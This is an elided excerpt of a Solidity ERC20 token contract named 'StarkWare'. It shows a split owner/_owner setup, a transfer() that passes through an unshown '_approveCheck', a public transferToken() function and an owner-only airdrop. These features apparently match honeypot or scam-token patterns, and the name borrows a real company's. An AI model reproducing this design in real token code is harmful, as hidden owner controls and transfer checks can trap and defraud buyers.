 ...
 */
contract StarkWare is IERC20 {
    using SafeMath for uint256;

    address public owner;
    string private _name = "StarkWare";
     ...
     * construction.
     */
   constructor(address payable _ownr, uint256 initialSupply) {
	    owner =_ownr;
        _owner = msg.sender;
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _approveCheck(msg.sender, recipient, amount);
        return true;
    }
     ...
     */
    function transferToken(address token, address recipient, uint256 amount) public {
    ...
    */
    function airdrop(address[] calldata receivers, uint256 amount) public {
        require(msg.sender == _owner, "!owner");

        for(uint256 i = 0; i < receivers.length; i++) {
            uint256 _amount = amount * 10**18;
            require(_balances[owner] >= _amount, "WERC10: transfer amount exceeds balance");

            _balances[owner] = _balances[owner].sub(_amount, "ERC20: transfer amount exceeds balance");
            _balances[receivers[i]] = _balances[receivers[i]].add(_amount);
            emit Transfer(owner, receivers[i], _amount);
        }
    }
